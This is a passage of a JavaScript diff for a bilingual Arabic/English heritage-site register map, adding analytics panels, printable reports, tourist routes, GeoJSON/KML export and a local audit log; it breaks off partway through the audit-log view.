+  const b=xhOpen(L('مؤشّر صحة التراث الوطني','National Heritage Health Index'),L('مقياس مركّب من متوسط التهدّم ونسبة المواقع الملحّة','Composite of avg decay & urgency share'));
+  const CIRC=2*Math.PI*15.9155;
+  let rows='';
+  DB.regions.map((r,i)=>({r,i,h:regionHealth(i)})).filter(x=>x.h).sort((a,b)=>b.h.score-a.h.score).forEach((x,k)=>{
+    const c=x.h.score>=70?'#2f6f72':x.h.score>=50?'#f59e41':'#bd343b';
+    rows+=`<div class="xh-hrow"><span class="xh-rank">${num(k+1)}</span><span class="xh-hname">${x.r}</span>
+      <div class="xh-track"><div class="xh-fill" style="width:${x.h.score}%;background:${c}"></div></div>
+      <b style="color:${c}">${num(x.h.score)}</b></div>`;
+  });
+  b.innerHTML=`
+    <div class="xh-gaugewrap">
+      <svg viewBox="0 0 42 42" class="xh-gauge">
+        <circle cx="21" cy="21" r="15.9155" fill="none" stroke="var(--panel-2)" stroke-width="4.5"/>
+        <circle cx="21" cy="21" r="15.9155" fill="none" stroke="${sc}" stroke-width="4.5" stroke-linecap="round"
+          stroke-dasharray="${(score/100*CIRC).toFixed(1)} ${CIRC}" transform="rotate(-90 21 21)"/>
+        <text x="21" y="20" text-anchor="middle" font-size="9.5" font-weight="800" fill="${sc}" font-family="Reem Kufi">${num(score)}</text>
+        <text x="21" y="27" text-anchor="middle" font-size="3.2" fill="var(--text-soft)">${L('من ١٠٠','/ 100')}</text>
+      </svg>
+      <div class="xh-gaugeinfo">
+        <div>${L('متوسط التهدّم الوطني','National avg decay')}: <b>${num(Math.round(avg*100))}٪</b></div>
+        <div>${L('مواقع ملحّة للترميم','Urgent sites')}: <b>${num(urg)}</b> (${num(Math.round(urgP*100))}٪)</div>
+        <div>${L('إجمالي الأصول','Total assets')}: <b>${num(N)}</b></div>
+      </div>
+    </div>
+    <h4 class="xh-h4">${L('ترتيب المناطق حسب صحة التراث','Regions ranked by heritage health')}</h4>
+    <div class="xh-hlist">${rows}</div>`;
+}
+
+/* ============================================================
+   4) NATIONAL PRIORITIES
+   ============================================================ */
+function openPriorities(){
+  const list=[];
+  for(let i=0;i<DB.sites.length;i++){const s=DB.sites[i];if(passes(s))list.push({i,r:riskScore(s)});}
+  list.sort((a,b)=>b.r-a.r);
+  const top=list.slice(0,100);
+  const b=xhOpen(L('الأولويات الوطنية للترميم','National restoration priorities'),
+    L(`أعلى ${num(Math.min(100,top.length))} موقعاً حسب مؤشّر المخاطر المركّب (تهدّم × أهمية × غياب أعمال)`,`Top ${num(Math.min(100,top.length))} by composite risk`));
+  const rows=top.slice(0,25).map((o,k)=>{const s=DB.sites[o.i];const rc=riskColor(o.r);
+    return `<div class="xh-row" data-goto="${o.i}"><span class="xh-rank" style="background:${k<3?'#bd343b':'var(--panel-2)'};color:${k<3?'#fff':'var(--text)'}">${num(k+1)}</span>
+      <div class="xh-rowmain"><b>${s[1]}</b><span class="xh-soft">${DB.govs[s[5]]} · ${DB.regions[s[4]]}</span></div>
+      <span class="xh-tag" style="background:${rc}22;color:${rc}">${num(o.r)}</span>
+      <span class="xh-soft">${s[10]!=null?num(Math.round(s[10]*100))+'٪':'—'}</span></div>`;}).join('');
+  b.innerHTML=`<div class="xh-actionrow"><button class="xh-btn" id="xhPrioPrint">🖨 ${L('طباعة القائمة الكاملة (١٠٠)','Print full list (100)')}</button></div>
+    <div class="xh-rows">${rows}</div>
+    <div class="xh-note">${L('القائمة تتبع الفلاتر الحالية. اضغط أي موقع للانتقال إليه.','Follows current filters. Click a site to fly to it.')}</div>`;
+  b.addEventListener('click',e=>{
+    const r=e.target.closest('[data-goto]');if(!r)return;
+    xhClose();setView('map');gotoSite(+r.dataset.goto);
+  });
+  $('xhPrioPrint').onclick=()=>{
+    const today=new Date().toLocaleDateString(LANG==='ar'?'ar-SA':'en-GB');
+    const trs=top.map((o,k)=>{const s=DB.sites[o.i];
+      return `<tr><td>${num(k+1)}</td><td>${s[1]}</td><td>${DB.regions[s[4]]}</td><td>${DB.govs[s[5]]}</td><td style="text-align:center;font-weight:700;color:${riskColor(o.r)}">${num(o.r)}</td><td style="text-align:center">${s[10]!=null?num(Math.round(s[10]*100))+'٪':'—'}</td></tr>`;}).join('');
+    $('pdfReport').innerHTML=`<div class="pdfr-inner">
+      <div class="pdfr-head">${window.HC_LOGO?`<img src="${window.HC_LOGO}" alt="">`:'<span></span>'}
+        <div class="pdfr-title"><h1>${t('reg_name')}</h1><p>${L('قائمة الأولويات الوطنية للترميم','National Restoration Priorities')} — ${today}</p></div></div>
+      <table class="pdfr-table"><thead><tr><th>#</th><th>${t('lh_name')}</th><th>${L('المنطقة','Region')}</th><th>${L('المحافظة','Governorate')}</th><th>${L('المخاطر','Risk')}</th><th>${t('lh_decay')}</th></tr></thead><tbody>${trs}</tbody></table>
+      <div class="pdfr-foot">${L('وثيقة صادرة عن السجل الوطني للتراث العمراني','National Urban Heritage Register document')}</div></div>`;
+    document.body.classList.add('printing-report');
+    setTimeout(()=>{window.print();setTimeout(()=>document.body.classList.remove('printing-report'),400);},250);
+  };
+}
+
+/* ============================================================
+   5) TIMELINE
+   ============================================================ */
+function openTimeline(){
+  let maxAge=0,withAge=0;
+  for(const s of DB.sites){if(s[9]!=null){withAge++;if(s[9]>maxAge)maxAge=s[9];}}
+  maxAge=Math.min(600,Math.max(100,maxAge));
+  const b=xhOpen(L('الخط الزمني التاريخي','Historical timeline'),
+    L(`اعرض المواقع التي يبلغ عمرها كذا سنة فأكثر (${num(withAge)} موقعاً له عمر مسجّل)`,`Show sites at least N years old (${num(withAge)} dated)`));
+  b.innerHTML=`
+    <div class="xh-yearrow"><span class="xh-year" id="xtVal">${L('الكل','All')}</span>
+      <input type="range" id="xtRange" min="0" max="${maxAge}" value="0" step="10" style="flex:1;direction:ltr">
+      <button class="xh-btn ghost" id="xtPlay">▶ ${L('رحلة عبر الزمن','Time travel')}</button></div>
+    <div class="xh-kpirow">
+      <div class="xh-kpi"><b id="xtCount">—</b><span>${L('موقع ظاهر','sites shown')}</span></div>
+      <div class="xh-kpi"><b id="xtOldest">—</b><span>${L('أقدم موقع ظاهر','oldest shown')}</span></div>
+    </div>
+    <div class="xh-note">${L('اسحب المؤشّر: كلما زاد العمر، بقيت المواقع الأقدم فقط على الخريطة.','Drag: only sites older than the threshold remain.')}</div>`;
+  const apply=v=>{
+    XF.ageMin=v>0?v:null;
+    $('xtVal').textContent=v>0?(L('≥ ','≥ ')+num(v)+' '+L('سنة','yrs')):L('الكل','All');
+    render();
+    let c=0,old=0;
+    for(const s of DB.sites)if(passes(s)){c++;if(s[9]>old)old=s[9];}
+    $('xtCount').textContent=num(c);
+    $('xtOldest').textContent=old?num(old)+' '+L('سنة','yrs'):'—';
+  };
+  $('xtRange').oninput=e=>apply(+e.target.value);
+  let playT=null;
+  $('xtPlay').onclick=function(){
+    if(playT){clearInterval(playT);playT=null;this.textContent='▶ '+L('رحلة عبر الزمن','Time travel');return;}
+    this.textContent='⏸ '+L('إيقاف','Pause');
+    $('xtRange').value=0;
+    playT=setInterval(()=>{
+      const r=$('xtRange');
+      if(!r){clearInterval(playT);playT=null;return;}
+      let v=+r.value+10;
+      if(v>+r.max){clearInterval(playT);playT=null;const p=$('xtPlay');if(p)p.textContent='▶ '+L('رحلة عبر الزمن','Time travel');return;}
+      r.value=v;apply(v);
+    },420);
+  };
+  apply(0);
+  _xhOnClose=()=>{if(playT)clearInterval(playT);XF.ageMin=null;render();};
+}
+
+/* ============================================================
+   6) VILLAGE EXPLORER
+   ============================================================ */
+function openVillages(){
+  const vs=xhVillages();
+  const b=xhOpen(L('مستكشف القرى التراثية','Heritage village explorer'),
+    L(`${num(vs.length)} قرية تراثية مكتشفة تلقائياً من أسماء المواقع`,`${num(vs.length)} villages auto-detected`));
+  b.innerHTML=`<input class="xh-in" id="xvSearch" placeholder="${L('ابحث عن قرية…','Search villages…')}" style="margin-bottom:12px">
+    <div class="xh-rows" id="xvList"></div>`;
+  const renderVs=q=>{
+    const nq=norm(q||'');
+    const list=vs.filter(v=>!nq||norm(v.name).includes(nq)).slice(0,60);
+    $('xvList').innerHTML=list.map((v,k)=>{
+      const dc=v.avgDecay==null?'#9bb0b6':v.avgDecay<35?'#7fb9bb':v.avgDecay<50?'#f59e41':'#bd343b';
+      return `<div class="xh-row" data-v="${vs.indexOf(v)}">
+        <div class="xh-rowmain"><b>${v.name}</b><span class="xh-soft">${DB.govs[v.gov]} · ${DB.regions[v.reg]}</span></div>
+        <span class="xh-tag" style="background:var(--panel-2)">${num(v.idxs.length)} ${L('مبنى','bldg')}</span>
+        ${v.avgDecay!=null?`<span class="xh-tag" style="background:${dc}22;color:${dc}">${num(v.avgDecay)}٪</span>`:''}</div>`;
+    }).join('')||`<div class="xh-note">${L('لا نتائج','No results')}</div>`;
+  };
+  renderVs('');
+  $('xvSearch').oninput=e=>renderVs(e.target.value);
+  $('xvList').onclick=e=>{
+    const r=e.target.closest('[data-v]');if(!r)return;
+    const v=vs[+r.dataset.v]; if(!v)return;
+    xhClose(); setView('map'); ensureVillages();
+    let s0=99,w=999,n0=-99,e0=-999;
+    v.idxs.forEach(i=>{const x=DB.sites[i];s0=Math.min(s0,x[2]);n0=Math.max(n0,x[2]);w=Math.min(w,x[3]);e0=Math.max(e0,x[3]);});
+    map.fitBounds([[s0,w],[n0,e0]],0.25);
+    // profile card popup at centroid
+    const clsRows=Object.entries(v.cls).sort((a,b)=>b[1]-a[1]).map(([ci,n])=>`${DB.classes[ci]}: ${num(n)}`).join(' · ');
+    setTimeout(()=>{
+      map.openPopup(`<div class="pop"><div class="pop-c" style="min-width:230px"><h3>${v.name}</h3>
+        <div class="pm">${DB.govs[v.gov]} · ${DB.regions[v.reg]}</div>
+        <div class="pm" style="margin-top:6px"><b>${num(v.idxs.length)}</b> ${L('مبنى تراثي','heritage buildings')}${v.avgDecay!=null?` · ${L('متوسط التهدّم','avg decay')} <b>${num(v.avgDecay)}٪</b>`:''}</div>
+        <div class="pm" style="margin-top:4px;font-size:11px">${clsRows}</div></div></div>`,[v.lat,v.lng]);
+    },900);
+  };
+}
+
+/* ============================================================
+   7) TOURIST ROUTES
+   ============================================================ */
+function openRoutes(){
+  const b=xhOpen(L('المسارات السياحية التراثية','Heritage tourist routes'),
+    L('اختر منطقة وسيُرسم مسار يربط أبرز قراها ومواقعها بترتيب أقصر مسافة','Pick a region — a shortest-hop route links its top villages'));
+  const counts=DB.regions.map((_,i)=>DB.sites.reduce((a,s)=>a+(s[4]===i?1:0),0));
+  const order=counts.map((c,i)=>[c,i]).filter(x=>x[0]>0).sort((a,b)=>b[0]-a[0]).map(x=>x[1]);
+  b.innerHTML=`<div class="xh-chips">${order.map(ri=>`<button class="xh-chip" data-ri="${ri}">${DB.regions[ri]}</button>`).join('')}</div>
+    <div id="xrOut"></div>
+    <div class="xh-actionrow" id="xrActs" style="display:none">
+      <button class="xh-btn ghost" id="xrClear">${L('مسح المسار','Clear route')}</button></div>`;
+  b.querySelectorAll('.xh-chip').forEach(c=>c.onclick=()=>buildRoute(+c.dataset.ri));
+  function buildRoute(ri){
+    const vs=xhVillages().filter(v=>v.reg===ri).slice(0,8);
+    let stops=vs.map(v=>({lat:v.lat,lng:v.lng,name:v.name,n:v.idxs.length}));
+    if(stops.length<3){
+      // fall back to top class-A / risky standalone sites
+      const extra=[];
+      for(let i=0;i<DB.sites.length;i++){const s=DB.sites[i];
+        if(s[4]!==ri)continue;
+        if(DB.classes[s[6]]==='أ')extra.push({lat:s[2],lng:s[3],name:s[1],n:1,r:riskScore(s)});}
+      extra.sort((a,b)=>(b.r||0)-(a.r||0));
+      stops=stops.concat(extra.slice(0,8-stops.length));
+    }
+    if(stops.length<2){$('xrOut').innerHTML=`<div class="xh-note">${L('لا تتوفر محطات كافية في هذه المنطقة','Not enough stops in this region')}</div>`;return;}
+    // nearest-neighbour ordering
+    const route=[stops.shift()];
+    while(stops.length){
+      const last=route[route.length-1];
+      let bi=0,bd=1e9;
+      stops.forEach((st,i)=>{const d=haversine(last.lat,last.lng,st.lat,st.lng);if(d<bd){bd=d;bi=i;}});
+      route.push(stops.splice(bi,1)[0]);
+    }
+    XHOV.route=route; map.invalidate();
+    let total=0;
+    const legs=route.map((st,i)=>{
+      let leg='';
+      if(i>0){const d=haversine(route[i-1].lat,route[i-1].lng,st.lat,st.lng);total+=d;leg=`<span class="xh-soft">+${num(d.toFixed(1))} ${L('كم','km')}</span>`;}
+      return `<div class="xh-row"><span class="xh-rank" style="background:#6e2a53;color:#fff">${num(i+1)}</span>
+        <div class="xh-rowmain"><b>${st.name}</b>${st.n>1?`<span class="xh-soft">${num(st.n)} ${L('مبنى','bldgs')}</span>`:''}</div>${leg}</div>`;
+    }).join('');
+    $('xrOut').innerHTML=`<div class="xh-kpirow" style="margin-top:12px">
+        <div class="xh-kpi"><b>${num(route.length)}</b><span>${L('محطات','stops')}</span></div>
+        <div class="xh-kpi"><b>${num(total.toFixed(0))} ${L('كم','km')}</b><span>${L('طول المسار التقريبي','approx. route length')}</span></div></div>
+      <div class="xh-rows">${legs}</div>
+      <div class="xh-note">${L('المسار مرسوم الآن على الخريطة بأرقام المحطات.','Route drawn on the map with numbered stops.')}</div>`;
+    $('xrActs').style.display='';
+    // fit map
+    let s0=99,w=999,n0=-99,e0=-999;
+    route.forEach(st=>{s0=Math.min(s0,st.lat);n0=Math.max(n0,st.lat);w=Math.min(w,st.lng);e0=Math.max(e0,st.lng);});
+    setView('map');map.fitBounds([[s0,w],[n0,e0]],0.2);
+  }
+  $('xrClear').onclick=()=>{XHOV.route=null;map.invalidate();$('xrActs').style.display='none';$('xrOut').innerHTML='';};
+}
+
+/* ============================================================
+   8) CINEMATIC TOUR
+   ============================================================ */
+let _tourT=null,_tourI=0,_tourOn=false;
+function startTour(){
+  const vs=xhVillages().slice(0,12);
+  if(!vs.length){toast(L('لا توجد قرى كافية للجولة','Not enough villages'));return;}
+  xhClose();_tourOn=true;_tourI=0;
+  $('xhTourBar').classList.add('show');
+  setView('map');
+  tourStep(vs);
+}
+function tourStep(vs){
+  if(!_tourOn)return;
+  const v=vs[_tourI%vs.length];
+  map.flyTo([v.lat,v.lng],12.5,2400);
+  const card=$('xhTourCard');
+  card.classList.remove('in');
+  setTimeout(()=>{
+    if(!_tourOn)return;
+    card.innerHTML=`<div class="xtc-k">${L('محطة','Stop')} ${num(_tourI%vs.length+1)} / ${num(vs.length)}</div>
+      <div class="xtc-name">${v.name}</div>
+      <div class="xtc-meta">${DB.govs[v.gov]} · ${DB.regions[v.reg]} — <b>${num(v.idxs.length)}</b> ${L('مبنى تراثي','heritage buildings')}${v.avgDecay!=null?` · ${L('تهدّم','decay')} ${num(v.avgDecay)}٪`:''}</div>`;
+    card.classList.add('in');
+  },1400);
+  _tourI++;
+  _tourT=setTimeout(()=>tourStep(vs),6800);
+}
+function stopTour(){
+  _tourOn=false;clearTimeout(_tourT);
+  $('xhTourBar').classList.remove('show');
+  $('xhTourCard').classList.remove('in');
+}
+
+/* ============================================================
+   9) PROTECTION BUFFERS
+   ============================================================ */
+function toggleBuffers(){
+  if(XHOV.buffers){XHOV.buffers=null;map.invalidate();toast(L('تم إخفاء نطاقات الحماية','Buffers hidden'));xhClose();return;}
+  const ai=DB.classes.indexOf('أ');
+  const pts=[];
+  for(const s of DB.sites)if(s[6]===ai&&passes(s))pts.push([s[2],s[3]]);
+  if(!pts.length){toast(L('لا توجد مواقع فئة (أ) ضمن الفلاتر الحالية','No Class A sites in current filters'));return;}
+  XHOV.buffers={pts,radius:500};
+  map.invalidate();xhClose();setView('map');
+  toast(L(`نطاقات حماية ٥٠٠م حول ${num(pts.length)} موقع فئة (أ) — كبّر الخريطة لرؤيتها`,`500m buffers on ${num(pts.length)} Class A sites — zoom in`));
+}
+
+/* ============================================================
+   10) RADAR COMPARE
+   ============================================================ */
+function regionAxes(ri){
+  let n=0,dS=0,dN=0,aS=0,aN=0,clsA=0,urg=0,compl=0;
+  const hers=new Set();
+  for(const s of DB.sites){
+    if(s[4]!==ri)continue;n++;
+    if(s[10]!=null){dS+=s[10];dN++;if(s[10]>=0.5)urg++;}
+    if(s[9]!=null){aS+=s[9];aN++;}
+    if(DB.classes[s[6]]==='أ')clsA++;
+    if(s[8]!=null&&DB.heritage[s[8]]!=='غير محدد')hers.add(s[8]);
+    let f=0;if(s[10]!=null)f++;if(s[9]!=null)f++;if(s[11]!=null)f++;if(s[13]>=0)f++;if(s[15]>=0)f++;
+    compl+=f/5;
+  }
+  if(!n)return null;
+  return [n, clsA/n*100, dN?100-(dS/dN*100):50, aN?aS/aN:0, hers.size, compl/n*100];
+}
+function openRadar(){
+  const b=xhOpen(L('مقارنة المناطق — رادار','Region radar comparison'),L('اختر من ٢ إلى ٤ مناطق','Pick 2–4 regions'));
+  const AXES=[L('عدد الأصول','Assets'),L('فئة أ ٪','Class A %'),L('السلامة','Condition'),L('متوسط العمر','Avg age'),L('تنوّع التراث','Diversity'),L('اكتمال البيانات','Completeness')];
+  const COLORS=['#113241','#e95345','#f59e41','#6e2a53'];
+  const counts=DB.regions.map((_,i)=>DB.sites.reduce((a,s)=>a+(s[4]===i?1:0),0));
+  const order=counts.map((c,i)=>[c,i]).filter(x=>x[0]>0).sort((a,b)=>b[0]-a[0]).map(x=>x[1]);
+  let sel=order.slice(0,3);
+  b.innerHTML=`<div class="xh-chips" id="xrdChips"></div><div id="xrdSvg" style="text-align:center"></div><div id="xrdLegend" class="xh-chips" style="justify-content:center"></div>`;
+  function drawChips(){
+    $('xrdChips').innerHTML=order.map(ri=>`<button class="xh-chip ${sel.includes(ri)?'sel':''}" data-ri="${ri}">${DB.regions[ri]}</button>`).join('');
+    $('xrdChips').querySelectorAll('.xh-chip').forEach(c=>c.onclick=()=>{
+      const ri=+c.dataset.ri;
+      if(sel.includes(ri)){if(sel.length>2)sel=sel.filter(x=>x!==ri);}
+      else if(sel.length<4)sel.push(ri);
+      drawChips();draw();
+    });
+  }
+  function draw(){
+    const data=sel.map(ri=>({ri,ax:regionAxes(ri)})).filter(x=>x.ax);
+    const maxs=AXES.map((_,k)=>Math.max(...data.map(d=>d.ax[k]),1));
+    const CX=170,CY=155,R=110,NA=AXES.length;
+    const pt=(k,val)=>{const a=-Math.PI/2+k*2*Math.PI/NA;const r=R*Math.max(0.04,val/maxs[k]);return [CX+r*Math.cos(a),CY+r*Math.sin(a)];};
+    let grid='';
+    for(let ring=1;ring<=4;ring++){
+      const pts=AXES.map((_,k)=>{const a=-Math.PI/2+k*2*Math.PI/NA;return `${CX+R*ring/4*Math.cos(a)},${CY+R*ring/4*Math.sin(a)}`;}).join(' ');
+      grid+=`<polygon points="${pts}" fill="none" stroke="var(--border)" stroke-width="1"/>`;
+    }
+    let axes='';
+    AXES.forEach((lbl,k)=>{
+      const a=-Math.PI/2+k*2*Math.PI/NA;
+      const x=CX+(R+24)*Math.cos(a),y=CY+(R+22)*Math.sin(a);
+      axes+=`<line x1="${CX}" y1="${CY}" x2="${CX+R*Math.cos(a)}" y2="${CY+R*Math.sin(a)}" stroke="var(--border)" stroke-width="1"/>
+        <text x="${x}" y="${y}" text-anchor="middle" font-size="10.5" font-weight="600" fill="var(--text-soft)" font-family="IBM Plex Sans Arabic">${lbl}</text>`;
+    });
+    let polys='';
+    data.forEach((d,i)=>{
+      const pts=d.ax.map((v,k)=>pt(k,v).join(',')).join(' ');
+      polys+=`<polygon points="${pts}" fill="${COLORS[i]}22" stroke="${COLORS[i]}" stroke-width="2.2" stroke-linejoin="round"/>`;
+      d.ax.forEach((v,k)=>{const[x,y]=pt(k,v);polys+=`<circle cx="${x}" cy="${y}" r="3.4" fill="${COLORS[i]}" stroke="#fff" stroke-width="1.4"/>`;});
+    });
+    $('xrdSvg').innerHTML=`<svg viewBox="0 0 340 315" style="max-width:430px;width:100%">${grid}${axes}${polys}</svg>`;
+    $('xrdLegend').innerHTML=data.map((d,i)=>`<span class="xh-chip sel" style="background:${COLORS[i]}18;border-color:${COLORS[i]};color:${COLORS[i]};pointer-events:none">■ ${DB.regions[d.ri]}</span>`).join('');
+  }
+  drawChips();draw();
+}
+
+/* ============================================================
+   11) SURVEY PROGRESS
+   ============================================================ */
+function openProgress(){
+  const b=xhOpen(L('اكتمال الحصر الميداني','Field survey completeness'),
+    L('متوسط نسبة الحقول المعبّأة لكل موقع (تهدّم، عمر، قرار، حي، ملكية) حسب المنطقة','Avg share of filled fields per site, by region'));
+  const rows=DB.regions.map((r,ri)=>{
+    let n=0,compl=0;
+    for(const s of DB.sites){
+      if(s[4]!==ri)continue;n++;
+      let f=0;if(s[10]!=null)f++;if(s[9]!=null)f++;if(s[11]!=null)f++;if(s[13]>=0)f++;if(s[15]>=0)f++;
+      compl+=f/5;
+    }
+    return n?{r,n,pct:Math.round(compl/n*100)}:null;
+  }).filter(Boolean).sort((a,b)=>b.pct-a.pct);
+  const totalPct=Math.round(rows.reduce((a,x)=>a+x.pct*x.n,0)/rows.reduce((a,x)=>a+x.n,0));
+  b.innerHTML=`<div class="xh-kpirow"><div class="xh-kpi"><b>${num(totalPct)}٪</b><span>${L('الاكتمال الوطني العام','national completeness')}</span></div>
+    <div class="xh-kpi"><b>${num(DB.sites.length)}</b><span>${L('موقع في السجل','sites in register')}</span></div></div>
+    <div class="xh-hlist">${rows.map((x,k)=>{
+      const c=x.pct>=75?'#2f6f72':x.pct>=50?'#f59e41':'#bd343b';
+      return `<div class="xh-hrow"><span class="xh-rank">${num(k+1)}</span><span class="xh-hname">${x.r} <span class="xh-soft">(${num(x.n)})</span></span>
+        <div class="xh-track"><div class="xh-fill" style="width:${x.pct}%;background:${c}"></div></div><b style="color:${c}">${num(x.pct)}٪</b></div>`;
+    }).join('')}</div>
+    <div class="xh-note">${L('كلما أضفت بيانات مواقع جديدة أو أكملت الحقول الناقصة، ارتفعت النسبة تلقائياً.','Fill missing fields and the score rises automatically.')}</div>`;
+}
+
+/* ============================================================
+   12) NATIONAL ATLAS (print)
+   ============================================================ */
+function buildAtlas(){
+  const today=new Date().toLocaleDateString(LANG==='ar'?'ar-SA':'en-GB');
+  const counts=DB.regions.map((_,i)=>DB.sites.reduce((a,s)=>a+(s[4]===i?1:0),0));
+  const order=counts.map((c,i)=>[c,i]).filter(x=>x[0]>0).sort((a,b)=>b[0]-a[0]).map(x=>x[1]);
+  let sections='';
+  for(const ri of order){
+    const st=regionStats(ri);
+    const sites=DB.sites.filter(s=>s[4]===ri);
+    const byGov={};for(const s of sites)byGov[s[5]]=(byGov[s[5]]||0)+1;
+    const govSorted=Object.entries(byGov).sort((a,b)=>b[1]-a[1]);
+    const topRisk=sites.map(s=>({s,r:riskScore(s)})).sort((a,b)=>b.r-a.r).slice(0,10);
+    sections+=`<div style="page-break-before:always;padding-top:10px">
+      <h2 style="font-family:'Reem Kufi',sans-serif;color:#113241;font-size:22px;border-bottom:3px solid #f59e41;padding-bottom:8px;margin-bottom:16px">${DB.regions[ri]}</h2>
+      <div class="pdfr-meta">
+        <div class="pdfr-kpi"><b>${num(st.n)}</b><span>${L('إجمالي الأصول','Assets')}</span></div>
+        <div class="pdfr-kpi"><b>${num(govSorted.length)}</b><span>${L('المحافظات','Governorates')}</span></div>
+        <div class="pdfr-kpi"><b>${num(st.avgDecay)}٪</b><span>${L('متوسط التهدّم','Avg decay')}</span></div>
+        <div class="pdfr-kpi"><b>${num(st.urgent)}</b><span>${L('ملحّة للترميم','Urgent')}</span></div>
+      </div>
+      <h3 style="font-size:13px;color:#113241;margin:14px 0 8px">${L('التوزيع حسب المحافظة','By governorate')}</h3>
+      <table class="pdfr-table"><tbody>${govSorted.slice(0,12).map(([gi,n])=>`<tr><td>${DB.govs[gi]}</td><td style="text-align:center">${num(n)}</td></tr>`).join('')}</tbody></table>
+      <h3 style="font-size:13px;color:#113241;margin:14px 0 8px">${L('أعلى ١٠ مواقع خطورة','Top 10 by risk')}</h3>
+      <table class="pdfr-table"><tbody>${topRisk.map((o,i)=>`<tr><td>${num(i+1)}</td><td>${o.s[1]}</td><td>${DB.govs[o.s[5]]}</td><td style="text-align:center;font-weight:700">${num(o.r)}</td></tr>`).join('')}</tbody></table>
+    </div>`;
+  }
+  $('pdfReport').innerHTML=`<div class="pdfr-inner">
+    <div style="text-align:center;padding:120px 0 60px">
+      ${window.HC_LOGO?`<img src="${window.HC_LOGO}" style="height:70px;margin-bottom:26px" alt="">`:''}
+      <h1 style="font-family:'Reem Kufi',sans-serif;font-size:34px;color:#113241;margin-bottom:10px">${t('reg_name')}</h1>
+      <div style="font-size:18px;color:#555">${L('الأطلس الوطني للتراث العمراني','National Urban Heritage Atlas')}</div>
+      <div style="font-size:13px;color:#888;margin-top:14px">${num(DB.sites.length)} ${L('أصل تراثي','heritage assets')} · ${num(order.length)} ${L('منطقة','regions')} — ${today}</div>
+    </div>
+    ${sections}
+    <div class="pdfr-foot">${L('وثيقة صادرة عن السجل الوطني للتراث العمراني','National Urban Heritage Register document')}</div></div>`;
+  document.body.classList.add('printing-report');
+  setTimeout(()=>{window.print();setTimeout(()=>document.body.classList.remove('printing-report'),400);},350);
+}
+
+/* ============================================================
+   13) GEOJSON / KML EXPORT
+   ============================================================ */
+function openGeoExport(){
+  const b=xhOpen(L('تصدير جغرافي','Geographic export'),L('يُصدَّر ما يطابق الفلاتر الحالية — متوافق مع Google Earth و QGIS و ArcGIS','Exports filtered sites for Google Earth / QGIS / ArcGIS'));
+  const n=DB.sites.reduce((a,s)=>a+(passes(s)?1:0),0);
+  b.innerHTML=`<div class="xh-kpirow"><div class="xh-kpi"><b>${num(n)}</b><span>${L('موقع سيُصدَّر','sites to export')}</span></div></div>
+    <div class="xh-actionrow">
+      <button class="xh-btn" id="xgJson">🌍 GeoJSON</button>
+      <button class="xh-btn" id="xgKml">🛰 KML (Google Earth)</button></div>`;
+  const dl=(txt,name,type)=>{const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([txt],{type}));a.download=name;a.click();toast(t('exported'));};
+  const props=s=>({code:s[0],name:s[1],region:DB.regions[s[4]],governorate:DB.govs[s[5]],class:DB.classes[s[6]],type:DB.types[s[7]],heritage:DB.heritage[s[8]]||'',age:s[9],decay_pct:s[10]!=null?Math.round(s[10]*100):null,risk:riskScore(s)});
+  $('xgJson').onclick=()=>{
+    const feats=[];
+    for(const s of DB.sites){if(!passes(s))continue;
+      feats.push({type:'Feature',geometry:{type:'Point',coordinates:[s[3],s[2]]},properties:props(s)});}
+    dl(JSON.stringify({type:'FeatureCollection',features:feats}),'heritage_sites.geojson','application/geo+json');
+  };
+  $('xgKml').onclick=()=>{
+    const esc=v=>String(v==null?'':v).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    let pm='';
+    for(const s of DB.sites){if(!passes(s))continue;
+      const p=props(s);
+      pm+=`<Placemark><name>${esc(s[1])}</name><description>${esc(p.region+' · '+p.governorate+' — '+L('فئة ','Class ')+p.class+(p.decay_pct!=null?' — '+L('تهدّم ','decay ')+p.decay_pct+'%':''))}</description><Point><coordinates>${s[3]},${s[2]},0</coordinates></Point></Placemark>`;}
+    dl(`<?xml version="1.0" encoding="UTF-8"?><kml xmlns="http://www.opengis.net/kml/2.2"><Document><name>${esc(t('reg_name'))}</name>${pm}</Document></kml>`,'heritage_sites.kml','application/vnd.google-earth.kml+xml');
+  };
+}
+
+/* ============================================================
+   14) AUDIT LOG
+   ============================================================ */
+const AUDIT_KEY='heritage_audit_v1';
+function auditList(){try{return JSON.parse(localStorage.getItem(AUDIT_KEY)||'[]');}catch(e){return[];}}
+function logAudit(action,detail){
+  try{
+    const list=auditList();
+    list.unshift({t:Date.now(),a:action,d:String(detail||'').slice(0,120)});
+    localStorage.setItem(AUDIT_KEY,JSON.stringify(list.slice(0,500)));
+  }catch(e){}
+}
+// hook data-changing operations
+try{
+  const _addPhoto=addPhoto; addPhoto=function(code,blob){logAudit('photo_add',code);return _addPhoto(code,blob);};
+  const _delPhoto=delPhoto; delPhoto=function(id){logAudit('photo_del','#'+id);return _delPhoto(id);};
+  const _addDoc=addDoc; addDoc=function(code,name,blob){logAudit('doc_add',code+' — '+name);return _addDoc(code,name,blob);};
+  const _delDoc=delDoc; delDoc=function(id){logAudit('doc_del','#'+id);return _delDoc(id);};
+  const _setForm=setForm; setForm=function(code,name,blob){logAudit('form_add',code+' — '+name);return _setForm(code,name,blob);};
+  const _asSave=$('asSave').onclick;
+  $('asSave').onclick=function(){
+    const before=DB.sites.length;
+    _asSave.call(this);
+    if(DB.sites.length>before){const s=DB.sites[DB.sites.length-1];logAudit('site_add',s[0]+' — '+s[1]);}
+  };
+}catch(e){}
+const AUD_LBL={site_add:['إضافة موقع','Site added'],photo_add:['إضافة صورة','Photo added'],photo_del:['حذف صورة','Photo deleted'],doc_add:['إضافة مستند','Doc added'],doc_del:['حذف مستند','Doc deleted'],form_add:['رفع استمارة','Form uploaded']};
+function openAudit(){
+  const list=auditList();
+  const b=xhOpen(L('سجل التعديلات','Audit log'),L('توثيق تلقائي لكل إضافة وتعديل على هذا الجهاز','Every change on this device, auto-documented'));
+  const rows=list.slice(0,80).map(e=>{
+    const lb=AUD_LBL[e.a]||[e.a,e.a];
+    const d=new Date(e.t);
+    return `<div class="xh-row"><span class="xh-tag" style="background:var(--panel-2)">${L(lb[0],lb[1])}</span>
+      <div class="xh-rowmain"><b>${e.d}</b></div>
+      <span class="xh-soft">${d.toLocaleDateString(LANG==='ar'?'ar-SA':'en-GB')} ${d.toLocaleTimeString(LANG==='ar'?'ar-SA':'en-GB',{hour:'2-digit',minute:'2-digit'})}</span></div>`;
+  }).join('');
+  b.innerHTML=`<div class="xh-actionrow">
